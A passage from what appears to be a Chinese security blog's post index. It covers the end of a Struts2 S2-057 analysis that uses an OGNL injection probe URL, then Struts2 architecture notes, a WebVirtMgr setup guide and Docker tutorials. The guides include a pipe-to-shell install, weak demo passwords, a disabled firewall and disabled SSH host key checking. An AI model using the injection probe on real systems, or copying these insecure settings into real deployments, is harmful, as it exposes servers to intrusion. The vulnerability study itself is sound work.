result我们来试试actionChain3，请求URLhttp://127.0.0.1:8080/struts2-showcase/${(5+2)}/actionChain3.action 和Action chaining类似，也是进入类com.opensymphony.xwork2.DefaultActionInvocation处理，这是具体的org.apache.struts2.result.PostbackResult对象，故我们进入PostbackResult的execute方法 123456@Overridepublic void execute(ActionInvocation invocation) throws Exception { String postbackUri = makePostbackUri(invocation); setLocation(postbackUri); super.execute(invocation);} 我们通过函数名称makePostbackUri，初步猜测为返回uri页面制作： 进入查看代码如下： 1234567891011121314151617181920protected String makePostbackUri(ActionInvocation invocation) { ActionContext ctx = invocation.getInvocationContext(); HttpServletRequest request = (HttpServletRequest) ctx.get(ServletActionContext.HTTP_REQUEST); String postbackUri; if (actionName != null) { actionName = conditionalParse(actionName, invocation); if (namespace == null) { namespace = invocation.getProxy().getNamespace(); } else { namespace = conditionalParse(namespace, invocation); } if (method == null) { method = \"\"; } else { method = conditionalParse(method, invocation); } postbackUri = request.getContextPath() + actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null));// 这里和上文actionMapper操作相同，这里不做阐述，直接看下图结果 } else {...} return postbackUri;} 然后，执行父类的excute方法 再跟入一次，与之前一样 得到结果如下： 奇怪，5+2居然不是502，23333 参考链接感谢各位大佬，如有错误请指出。 先知社区的chybeta 漏洞发现团队lgtm Struts官网的文档Postback result、Action chaining、Postback result Docker文档","link":"/2018/08/24/2018/S2-057%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"sturts2回顾","text":"审计S2系列CVE的时候发现很多struts都忘了，所以回顾一下struts2架构方面的知识。 整体流程struts2的流程图如下： 整个流程官方语言描述如下(以下Action指代Web服务器某个接口，如注册接口，代码体现为POJO、Bean，配置于struts2.xml中) 初始的请求通过一条标准的过滤器链，到达 servlet 容器 ( 比如 tomcat 容器，WebSphere 容器 )。 过滤器链包括可选的 ActionContextCleanUp 过滤器，用于系统整合技术，如 SiteMesh 插件。 接着调用 FilterDispatcher，FilterDispatcher 查找 ActionMapper，以确定这个请求是否需要调用某个 Action。 如果 ActionMapper 确定需要调用某个 Action，FilterDispatcher将控制权交给 ActionProxy。 ActionProxy 依照框架的配置文件(struts.xml)，找到需要调用的 Action 类。 ActionProxy 创建一个 ActionInvocation 的实例。ActionInvocation 先调用相关的拦截器 （Action 调用之前的部分），最后调用 Action。 一旦 Action 调用返回结果，ActionInvocation 根据 struts.xml 配置文件，查找对应的转发路径。返回结果通常是（但不总是，也可能是另外的一个 Action 链）JSP 技术或者 FreeMarker 的模版技术的网页呈现。Struts2 的标签和其他视图层组件，帮助呈现我们所需要的显示结果。在此，我想说清楚一些，最终的显示结果一定是 HTML 标签。标签库技术和其他视图层技术只是为了动态生成 HTML 标签。 接着按照相反次序执行拦截器链 ( 执行 Action 调用之后的部分 )。最后，响应通过滤器链返回（过滤器技术执行流程与拦截器一样，都是先执行前面部分，后执行后面部）。如果过滤器链中存在ActionContextCleanUp，FilterDispatcher不会清理线程局部的 ActionContext。如果不存在 ActionContextCleanUp 过滤器，FilterDispatcher 会清除所有线程局部变量。 简言之： 数据包处理权由FilterDispatcher 控制，而将请求的行为代理给ActionProxy ，这个代理去读取配置文件，然后使用ActionInvocation 实例去递归调用拦截器，最后FilterDispatcher 将结果返回。而所谓的数据中心与值栈，也就是ActionMapping与ValueStack。 ActionMappingActionMapping代表struts.xml文件中某个action配置，即当一个存在的action请求时，里面存放的就是他 ValueStack一个图就够了 Struts会把当前访问的Action实例压入值栈栈定 压栈时间: 由于Struts2最后终将调用Action类中的action方法。 方法调用前: 创建一个StrutsActionProxy (ActionProxy默认实现的子类) ，然后对其进行初始化，并把Action对象压入值栈 在调用该方法前该Action被压入栈顶，如果在初始化的过程中，在Action的构造函数中又初始化了其他类，这这个类也会被压入值栈。所以最后栈顶的元素会是这个新初始化的类。 结果集常用结果对象，请求可能返回的类集合却决于你的struts.xml配置，以下是框架所有结果类。 123456789101112131415&lt;result-types&gt; &lt;result-type name=\"chain\" class=\"com.opensymphony.xwork2.ActionChainResult\"/&gt; &lt;result-type name=\"dispatcher\" class=\"org.apache.struts2.dispatcher.ServletDispatcherResult\" default=\"true\"/&gt; &lt;result-type name=\"freemarker\" class=\"org.apache.struts2.views.freemarker.FreemarkerResult\"/&gt; &lt;result-type name=\"httpheader\" class=\"org.apache.struts2.dispatcher.HttpHeaderResult\"/&gt; &lt;result-type name=\"redirect\" class=\"org.apache.struts2.dispatcher.ServletRedirectResult\"/&gt; &lt;result-type name=\"redirectAction\" class=\"org.apache.struts2.dispatcher.ServletActionRedirectResult\"/&gt; &lt;result-type name=\"stream\" class=\"org.apache.struts2.dispatcher.StreamResult\"/&gt; &lt;result-type name=\"velocity\" class=\"org.apache.struts2.dispatcher.VelocityResult\"/&gt; &lt;result-type name=\"xslt\" class=\"org.apache.struts2.views.xslt.XSLTResult\"/&gt; &lt;result-type name=\"plainText\" class=\"org.apache.struts2.dispatcher.PlainTextResult\" /&gt; &lt;!-- Deprecated name form scheduled for removal in Struts 2.1.0. The camelCase versions are preferred. See ww-1707 --&gt; &lt;result-type name=\"redirect-action\" class=\"org.apache.struts2.dispatcher.ServletActionRedirectResult\"/&gt; &lt;result-type name=\"plaintext\" class=\"org.apache.struts2.dispatcher.PlainTextResult\" /&gt;&lt;/result-types&gt; （取自2.1.0版本，版本差异略有变动） 拦截器拦截器是struts2的亮眼设计，采用切面编程思想实现。 官方提供18个拦截器栈，很多很多拦截器，有兴趣的可以去网上看，很多很多教程这里不一一列举。 这里提一下拦截器和过滤器： 过滤器作用于所有请求，拦截器只作用于action的生命周期。 数据校验在sturts2中，数据校验的方式有很多种，我们这里看看服务端校验： validation拦截器负责判断Action是否实现validation接口，如果实现就调用validate方法 workflow拦截器判断Action是否实现validationAware接口，如果实现就会判断Action中是否包含错误信息。如果包含错误信息，停止拦截器递归调用，返回结果到名为input的结果页面中。 整个数据校验流程如下： 1234567891.类型转换器对请求参数执行类型转换，并把转换后的值赋给action中的属性2.如果在执行类型转换的过程中出现异常，系统会将异常信息保存到ActionContext，conversionError拦截器将异常信息封装到fieldErrors里，然后执行第3步。如果类型转换没有出现异常，则直接进入第3步。3.系统通过反射技术调用action中的validateXxx()方法，Xxx为方法名4.调用action中的validate()方法5.经过上面4步，如果系统中的fieldErrors存在错误信息（即存放错误信息的集合的size大于0)，系统自动将请求转发至名称为input的视图。如果系统中的fieldErrors没有任何错误信息，系统将执行action中的处理方法。 而校验方式实现又分为两种： 编程式校验 xml配置方式校验 编程式校验方式一实现接口：Validateable，提供一个方法 validate()，调用addFieldError，添加错误信息 的方式 加入错误信息 取出错误信息 addActionError(anErrorMessage)方法存入action的错误信息 \\&lt;s:actionerror/>取出action的错误信息 addFieldError(fieldName, errorMessage)方法存入字段的错误信息. \\&lt;s:fielderror fieldName=”xxx”/>取出字段的错误信息 addActionMessage(aMessage)方法存入action提示信息在页面 \\&lt;s:actionmessage/>取出action提示信息 注意：当然如果你的页面使用了struts2提供的表单标签.表单标签会自动显示字段的错误信息 方式二覆盖ActionSupport类的validate()方法，在这个方法中完成对参数的校验。validate()方法会在参数封装之后，在execute()方法之前执行。如果validate()方法中向fieldError中添加了错误信息，那么就不会再执行execute()方法，而是跳转到input结果码对应的页面。 校验进阶所有方法校验提供一个方法validate()，validate()方法是所有请求处理方法公共的校验方法。 跳过指定校验如果想跳过某个Action方法的校验，在不需要校验的Action方法上加入@SkipValidation 指定校验方法public的，没有返回值，没有参数（public void xxx()） 方法名称前缀为validate（例public void validateXxx()）或validateDo（例public void validateDoXxx()） 方法名后缀必须与请求处理方法名相同，例如请求处理方法为login()，则public validateLogin() 注意，私有校验方法会在公共校验方法（validate()）之前被调用。如果你要为execute()提供私有校验方法，那么这个方法名为validateExecute() 校验顺序：先执行单个方法校验，再执行所有方法校验 OGNL表达式OGNL的全称为Object Graphic Navigation Language（对象图导航语言），它是Struts2的默认表达式语言，因为十分好用，甚至滥用到出各种S2系列的RCE漏洞。 ValueStack值栈 作为ognl表达式的root根 生命周期和request请求生命周期一样 ActionContext数据中心 作为ongl表达式的context 都是在strutsprepareAndExcuteFilter拦截器中准备好 六大作用域request session application 注意：以上两对象皆在strutsPrepareAndExecuteFilter准备 OGNL在struts2执行图 使用上的结合： 表单提交，其中提交的键可以看作ognl表达式 将表单的参数赋值到对象 提交参数的键为user.name ，然后将在值栈中查找名为user的对象，并赋值到该对象的name属性 ModelDriver方式，Action在getModel方法中将User对象返回。ModelDriven拦截器会将我们返回的User对象放入值栈中(栈顶)，那么在表单中直接提交name，将会把name值装入栈顶的user对象的name属性。 OGNL使用OGNL与S2","link":"/2018/08/28/2018/Sturts2%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"},{"title":"WebVirtMgr安装教程","text":"WebVirtMgr是一个基于libvirt的Web界面，用于管理虚拟机，而且允许创建和配置新域，并调整域的资源分配，适用于网络安全实验模拟。 安装环境 系统：Ubuntu Server 14.04 确定 CPU 支持 KVMKVM 依赖于 x86 虚拟化扩展。为了检查兼容性，请运行命令 egrep -c '(vmx|svm)' /proc/cpuinfo 检查 CPU 是否支持 KVM 如果输出类似于以下数值(大于0)，那么 CPU 就支持 KVM；否则，CPU 不支持 KVM。 12toor@ubuntu:~$ egrep -c '(vmx|svm)' /proc/cpuinfo8 如果是0说明你的CPU当前不支持虚拟化 。 更换软件源由于这里是使用纯洁系统安装，所以需要更新APT软件库，为了提高速度使用国内清华源(可以不换)。 1234567891011toor@ubuntu:~$ cat /etc/apt/sources.listdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiversetoor@ubuntu:~$ sudo apt-get update... 安装必要软件安装git、Python、pip、libvirt、KVM以及其他管理环境包 123sudo apt-get install git python-pip -ysudo apt-get install qemu-kvm libvirt-bin virtinst bridge-utils sasl2-bin -ysudo apt-get install python-libvirt python-libxml2 novnc supervisor nginx -y 配置libvirt与KVM添加用户到libvirtd用户组中，我这里直接使用当前用户，建议新建用户类似webvirtmgr专门用于该管理服务。 12345# 添加当前用户为libvirtd用户组中sudo adduser `id -un` libvirtd# 新建用户（以webvirtmgr为例）sudo adduser webvirtmgrsudo usermod -G libvirtd -a webvirtmgr 在/etc/default/libvirt-bin中添加&quot;-d -l&quot;的选项，在/etc/libvirt/libvirtd.conf中去掉一些注释，用于开发16509端口 12345sudo sed -i 's/#libvirtd_opts=\"\"/libvirtd_opts=\"-d -l\"/g' /etc/default/libvirt-binsudo sed -i 's/#listen_tls/listen_tls/g' /etc/libvirt/libvirtd.confsudo sed -i 's/#listen_tcp/listen_tcp/g' /etc/libvirt/libvirtd.confsudo sed -i 's/#tcp_port/tcp_port/g' /etc/libvirt/libvirtd.confsudo service libvirt-bin restart 创建saslpassword 12sudo saslpasswd2 -a libvirt libvirt-root # libvirt-root为用户名Password:[password] # 这里输入密码，我这里是libvirt-toor 在ubuntu14.04中，防火墙管理工具为ufw，我们通过设置一个通过规则或者关闭防火墙来放行libvirt服务： 1234567# 防火墙# 方法1 设置规则sudo touch /etc/ufw/applications.d/libvirtdsudo bash -c \"echo -e '[Libvirt]\\ntitle=Virtualization library\\ndescription=Open port for libvirt\\nports=16509/tcp' &gt; /etc/ufw/applications.d/libvirtd\"sudo ufw allow from any to any app Libvirt# 方法2 关闭控制sudo ufw disable 验证安装结果 123456789101112$ virsh -c qemu+tcp://127.0.0.1/system nodeinfoPlease enter your authentication name: [username]Please enter your password: [password]#以下是正确的输出CPU model: x86_64CPU(s): 24CPU frequency: 1200 MHzCPU socket(s): 1Core(s) per socket: 6Thread(s) per core: 2NUMA cell(s): 2Memory size: 65903664 KiB 配置WebvirtMgr 拉去最新的webvirtmgr，然后安装相应的Python(2)依赖库 123git clone git://github.com/retspen/webvirtmgr.gitcd webvirtmgrsudo pip2 install -r requirements.txt 添加普通用户，以及载入网页静态文件，最后添加一个超级用户 123456789sudo ./manage.py syncdb# 输入用户信息：admin# 输入密码: admin# 再输密码: adminsudo ./manage.py collectstaticsudo ./manage.py createsuperuser# 输入用户信息：menzel3# 输入密码: menzel3# 再输密码: menzel3 以上为演示，请勿设置弱密码!!! 配置Nginx与Supervisor注释掉原nginx配置文件中的Server 部分： 123456789101112131415161718192021222324252627282930toor@ubuntu:~$ cat /etc/nginx/sites-enabled/default...# server {# listen 80 default_server;# server_name localhost;# root /usr/share/nginx/html;## #charset koi8-r;## #access_log /var/log/nginx/host.access.log main;## # Load configuration files for the default server block.# include /etc/nginx/default.d/*.conf;## location / {# }## # redirect server error pages to the static page /40x.html# ## error_page 404 /404.html;# location = /40x.html {# }## # redirect server error pages to the static page /50x.html# ## error_page 500 502 503 504 /50x.html;# location = /50x.html {# }# }... 在 /etc/nginx/conf.d 中添加 nginx的配置文件 webvirtmgr.conf： 1$ sudo vim /etc/nginx/conf.d/webvirtmgr.conf 配置如下： 1234567891011121314151617181920212223server { listen 80 default_server; server_name $hostname; #access_log /var/log/nginx/webvirtmgr_access_log; location /static/ { root /var/www/webvirtmgr/webvirtmgr; # or /srv instead of /var expires max; } location / { proxy_pass http://127.0.0.1:8000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 600; proxy_read_timeout 600; proxy_send_timeout 600; client_max_body_size 1024M; # Set higher depending on your needs }} 新建/etc/supervisor/conf.d/webvirtmgr.conf 文件，设置自动启动服务，其中第一个为Django服务端口8000端口，第二个为控制台vnc端口6080端口。 12345678910111213141516171819$ sudo vim /etc/supervisor/conf.d/webvirtmgr.conf[program:webvirtmgr]command=/usr/bin/python /var/www/webvirtmgr/manage.py run_gunicorn -c /var/www/webvirtmgr/conf/gunicorn.conf.pydirectory=/var/www/webvirtmgrautostart=trueautorestart=truestdout_logfile=/var/log/supervisor/webvirtmgr.logredirect_stderr=trueuser=www-data[program:webvirtmgr-console]command=/usr/bin/python /var/www/webvirtmgr/console/webvirtmgr-console -ddirectory=/var/www/webvirtmgrautostart=trueautorestart=truestdout_logfile=/var/log/supervisor/webvirtmgr-console.logredirect_stderr=trueuser=www-datasudo service nginx restart 默认/var/www/webvirtmgr/conf/gunicorn.conf.py文件是localhost:8000，如果想外部机器也能访问，可以修改文件选项如下： 1bind = '0:8000' # bind = 'localhost:8000' 将webvirtmgr移动到/var/www下，,如果没有请自行创建www目录，然后重启supervisor和Nginx 123$ sudo mv webvirtmgr /var/www/ &amp;&amp; sudo chown www-data:www-data /var/www$ sudo service supervisor restart$ sudo service nginx restart 检测服务启动成功 123456789101112131415161718$ sudo lsof -i:6080 &amp;&amp; sudo lsof -i:8000toor@ubuntu:~$ sudo lsof -i:6080 &amp;&amp; sudo lsof -i:8000COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEpython 2991 www-data 3u IPv4 11633 0t0 TCP *:6080 (LISTEN)COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEpython 2992 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 2998 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 2999 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3000 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3007 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3008 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3009 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3010 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3011 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3012 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3013 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3014 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN)python 3015 www-data 5u IPv4 17876 0t0 TCP *:8000 (LISTEN) 配置SSH连接由于我们将libvirt与webvirmgr装在一起，所以本地设置即可，将www-data用户与libvirt组用户(我这儿是toor)配置即可。 12345678# www-data用户$ sudo su - www-data -s /bin/bash$ ssh-keygen(回车!回车!回车!)$ touch ~/.ssh/config &amp;&amp; echo -e \"StrictHostKeyChecking=no\\nUserKnownHostsFile=/dev/null\" &gt;&gt; ~/.ssh/config$ chmod 0600 ~/.ssh/config$ ssh toor@192.168.10.115toor@192.168.10.115's password:# 这里输入toor密码即可，需要解释以下，这个ip是我的ip，请改为真实环境ip地址，toor为libvirtd组用户，请修改为你设置的libvirtd组用户，这里的密码也是该用户的密码。 访问页面192.168.10.115:8000，使用之前设置的超级用户及其密码menzel3:menzel3登陆 (将Label中M小写) 再点击menzel3 至此简易的webvirmgr搭建完成。","link":"/2018/10/10/2018/WebVirtMgr%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"},{"title":"Docker基础学习","text":"docker的基本使用及命令解释 docker及组件安装Ubuntu16手动及自动安装过程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 检查系统内核是否满足需求uname -aLinux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux# 检查device-mapper文件ls -l /sys/class/misc/device-mapperlrwxrwxrwx 1 root root 0 Jul 25 15:31 /sys/class/misc/device-mapper -&gt; ../../devices/virtual/misc/device-mapper# 如果出现 The repository '...' does no longer have a Release file. 类似的信息，先清除apt缓存# ubuntu version&gt;16.10等可能出现、建议升级内核，.10系列系统官方只维护10个月######## 正式安装 ########sudo apt-get remove docker \\ docker-engine \\ docker.io##################### 自动安装 sudo apt-get updatewget -qO- https://get.docker.com/ | sh##################### 手动安装 sudo apt-get updatesudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ software-properties-common# 添加app国内源curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -# 官方源# $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo apt-get update &amp;&amp; sudo apt-get install docker-ce -y##################### 相关配置 ###################### 配置docker组、这里的mzl是我的用户名sudo gpasswd -a mzl docker# 添加国内加速sudo vim /etc/docker/daemon.json # 如果没有新建文件(默认没有){ \"registry-mirrors\": [\"https://hj1kdhy0.mirror.aliyuncs.com\"]}# 启动Docker CEsudo systemctl enable docker &amp;&amp; sudo systemctl start dockersudo service docker restart##################### 注销用户重启进入 ##################### Centos手动及自动安装过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344##################### 手动安装 # 卸载旧版本或系统自带$ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine# 安装新版本$ sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2# 中国源$ sudo yum-config-manager \\ --add-repo \\ https://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo# 官方源# $ sudo yum-config-manager \\# --add-repo \\# https://download.docker.com/linux/centos/docker-ce.reposudo yum install docker-ce # sudo yum install docker-ce-&lt;VERSION STRING&gt; 指定版本安装$ sudo systemctl start docker$ sudo docker run hello-world$ yum list docker-ce --showduplicates | sort -r$ sudo yum makecache fastsudo yum install docker-ce --skip-broken##################### 自动安装 $ curl -fsSL get.docker.com -o get-docker.sh$ sudo sh get-docker.sh --mirror Aliyun##################### 启动服务 #####################$ sudo systemctl enable docker$ sudo systemctl start docker docker-composeDOCKER三剑客之docker-compose 12345# 二进制安装$ curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose$ chmod +x /usr/local/bin/docker-compose$ docker-compose --version 12# pip安装$ sudo pip install -U docker-compose docker使用容器基本使用容器的创建删除查看下载容器12私人镜像: docker pull 用户名/镜像名称:镜像版本号 官方镜像: docker pull 镜像名称:镜像版本号 上传容器12345678# 上传官方$ docker login$ docker push menzel3/fierce_phish:v0.1# 上传阿里云$ docker tag 40f16ba66b80 registry.cn-hangzhou.aliyuncs.com/menzel3/fierce_phish$ docker login --username=menzel3 registry.cn-hangzhou.aliyuncs.com$ docker push registry.cn-hangzhou.aliyuncs.com/menzel3/fierce_phish:v0.1 帮助文档：上传到阿里云Docker 创建容器123456789$ docker run IMAGE [COMMAND] [ARG] -i --interactive=true 标准输入 默认为false-t --tty=true TTY终端 默认为false-d 后台启动进程-p 如... -p 8080:80 ... 表示容器80端口映射到宿主机8080端口--name 如 --name menzel3 就表示名字为menzel3，也可以将' '换作'='# docker run --name $name -i -t ubuntu /bin/bash$ docker run --name mzl0 -d ubuntu /bin/sh -c \"while:true; do echo lalalala; sleep 1; done\" 启动容器12# docker start -i [names|id] # 通过id或名称启动容器$ docker start mzl0 删除容器镜像123$ docker rm [names|id] # 通过id或名称删除容器$ docker rmi [names|id] # 通过id或名称删除镜像 查看容器状态123$ docker ps -[a|l|]-a 所有容器-l 最新创建容器 查看容器配置1$ docker inspect [names|id] # 通过id或name查看容器或镜像配置信息 挂载的卷的相关命令 Command Description docker volume create Create a volume docker volume inspect Display detailed information on one or more volumes docker volume ls List volumes docker volume prune Remove all unused local volumes docker volume rm Remove one or more volumes 退出容器123451.在shell中输入 exit 回车退出退出后容器关闭2.摁ctrl qp键退出退出后容器后台运行,此时容器为守护容器 设置容器相关属性守护式容器|后台运行的容器再次进入守护式容器1$ docker attach [names|id] 查看容器运行日志1234$ docker logs [-f] [-t] [--tail] 容器名-f --follows=true|false 动态显示 默认为false-t --timestamps=true|false 加上时间戳 默认为false--tail $n 指定显示最新的 n 条 查看容器内进程1$ docker top [id|names] 查看容器内进程情况 奇怪指令docker run的–rm选项详解在Docker容器退出时，默认容器内部的文件系统仍然被保留，以方便调试并保留用户数据。 但是，对于foreground容器，由于其只是在开发调试过程中短期运行，其用户数据并无保留的必要，因而可以在容器启动时设置–rm选项，这样在容器退出时就能够自动清理容器内部的文件系统。示例如下： docker run --rm bba-208 等价于 docker run --rm=true bba-208 显然，–rm选项不能与-d同时使用，即只能自动清理foreground容器，不能自动清理detached容器 注意，–rm选项也会清理容器的匿名data volumes。 所以，执行docker run命令带–rm命令选项，等价于在容器退出后，执行docker rm -v。","link":"/2018/07/29/2018/docker/"},{"title":"DockerFile使用","text":"BUG与性能向的Dockerfile Dockerfile使用如何使用两步完成 创建文件夹，进入文件夹书写Dockerfile文件(文件名可以不为Dockerfile) 使用docker build &lt;参数&gt;命令构建镜像，完成后可以使用docker images查看 1docker build [选项] &lt;上下文路径/URL/-&gt; 1234$ mkdir Jenkins$ cd Jenkins$ vim Dockerfile$ docker build -t 镜像名称 . 其他构建方式直接用 Git repo 进行构建 或许你已经注意到了，docker build 还支持从 URL 构建，比如可以直接从 Git repo 中构建： 1$ docker build https://github.com/twang2218/gitlab-ce-zh.git#:10.7 这行命令指定了构建所需的 Git repo，并且指定默认的 master 分支，构建目录为 /10.7/，然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。 用给定的 tar 压缩包构建 1$ docker build http://server/context.tar.gz 如果所给出的 URL 不是个 Git repo，而是个 tar 压缩包，那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。 从标准输入中读取 Dockerfile 进行构建(有缺陷) 1docker build - &lt; Dockerfile 或 cat Dockerfile | docker build - 缺点：不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情。 从标准输入中读取上下文压缩包进行构建 1$ docker build - &lt; context.tar.gz 如果发现标准输入的文件格式是 gzip、bzip2 以及 xz 的话，将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。 Dockerfile书写语法格式 12345678910# 构架装有curl的ubuntu镜像FROM nginx# 作者信息MAINTAINER menzel3 \"233333@m.com\"# 安装curlRUN apt-get update &amp;&amp; apt-get install -y curlEXPOSE 80 EXPOSEEXPOSE 和在运行时使用 -p &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p，是映射宿主端口和容器端口，EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。 注意：只有声明过的端口才能被映射 CMD&amp;RUN&amp;ENTRYPOINTCMD 指令的格式与 RUN 相似，都是两种格式： shell 格式：CMD &lt;命令&gt; 与RUN &lt;命令&gt; exec 格式：CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...] 与 RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...] 传入的命令和参数会被解析为JSON 数组，请务必使用 “ 写入参数 区别： CMD指令为容器主进程开启后的默认执行命令，如果启动容器时指定了 ENTRYPOINT 指令后，用 CMD 命令将被覆盖。ENTRYPOINT比CMD功能多在不会被覆盖，而是追加命令。 RUN为构建镜像命令` WORKDIR格式为 WORKDIR &lt;工作目录路径&gt;。 使用 WORKDIR 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。 易错点：把 Dockerfile 等同于 Shell 脚本 ENV&amp;ARG设置环境变量 区别：ARG为所设置的构建环境的环境变量，构建完成即失效。(history命令能查看值) USER格式：USER &lt;用户名&gt; USER 指令和 WORKDIR 相似，都是改变环境状态并影响以后的层。WORKDIR 是改变工作目录，USER 则是改变之后层的执行 RUN, CMD 以及 ENTRYPOINT 这类命令的身份。 COPY&amp;ADD格式： COPY &lt;源路径&gt;... &lt;目标路径&gt; COPY [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;] 使用 COPY 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。 而ADD为加强版的COPY，附加的功能为 源路径可以是URL 具有自解压缩功能 注意： 路径可以是通配符 ，需满足Go的正则语法 尽可能使用COPY，ADD命令虽然功能丰富，但是其功能处于黑盒状态，且效率略低于直接COPY ONBUILD格式：ONBUILD &lt;其它指令&gt;。 ONBUILD 是一个特殊的指令，它后面跟的是其它指令，比如 RUN, COPY 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。 VOLUMES 创建一个挂在点，可以从本机或其他容器挂载的挂载点。 大白话：从容器中暴露出一部分，和外界共享，一般放数据库的数据或者是代码。 难点：权限问题 volume挂载的目录默认属于root用户，如果没有chown给其他用户的话，在Volume卷中创建的文件和文件夹将具有与在容器中创建它们的用户相同的uid:gid(数字)。 问题场景：使用 -v 选项将容器内容挂载到主系统下，默认所属组和用户为root，这时候如果容器内的执行权限低于root，你会发现一堆异常。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374FROM debian:jessie# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get added#RUN groupadd -r www-data &amp;&amp; useradd -r --create-home -g www-data www-dataENV HTTPD_PREFIX /usr/local/apache2ENV PATH $PATH:$HTTPD_PREFIX/binRUN mkdir -p \"$HTTPD_PREFIX\" \\ &amp;&amp; chown www-data:www-data \"$HTTPD_PREFIX\"WORKDIR $HTTPD_PREFIX# install httpd runtime dependencies# https://httpd.apache.org/docs/2.4/install.html#requirementsRUN apt-get update \\ &amp;&amp; apt-get install -y --no-install-recommends \\ libapr1 \\ libaprutil1 \\ libaprutil1-ldap \\ libapr1-dev \\ libaprutil1-dev \\ libpcre++0 \\ libssl1.0.0 \\ &amp;&amp; rm -r /var/lib/apt/lists/*ENV HTTPD_VERSION 2.4.20ENV HTTPD_BZ2_URL https://www.apache.org/dist/httpd/httpd-$HTTPD_VERSION.tar.bz2RUN buildDeps=' \\ ca-certificates \\ curl \\ bzip2 \\ gcc \\ libpcre++-dev \\ libssl-dev \\ make \\ ' \\ set -x \\ &amp;&amp; apt-get update \\ &amp;&amp; apt-get install -y --no-install-recommends $buildDeps \\ &amp;&amp; rm -r /var/lib/apt/lists/* \\ \\ &amp;&amp; curl -fSL \"$HTTPD_BZ2_URL\" -o httpd.tar.bz2 \\ &amp;&amp; curl -fSL \"$HTTPD_BZ2_URL.asc\" -o httpd.tar.bz2.asc \\# see https://httpd.apache.org/download.cgi#verify &amp;&amp; export GNUPGHOME=\"$(mktemp -d)\" \\ &amp;&amp; gpg --keyserver ha.pool.sks-keyservers.net --recv-keys A93D62ECC3C8EA12DB220EC934EA76E6791485A8 \\ &amp;&amp; gpg --batch --verify httpd.tar.bz2.asc httpd.tar.bz2 \\ &amp;&amp; rm -r \"$GNUPGHOME\" httpd.tar.bz2.asc \\ \\ &amp;&amp; mkdir -p src \\ &amp;&amp; tar -xvf httpd.tar.bz2 -C src --strip-components=1 \\ &amp;&amp; rm httpd.tar.bz2 \\ &amp;&amp; cd src \\ \\ &amp;&amp; ./configure \\ --prefix=\"$HTTPD_PREFIX\" \\ --enable-mods-shared=reallyall \\ &amp;&amp; make -j\"$(nproc)\" \\ &amp;&amp; make install \\ \\ &amp;&amp; cd .. \\ &amp;&amp; rm -r src \\ \\ &amp;&amp; sed -ri \\ -e 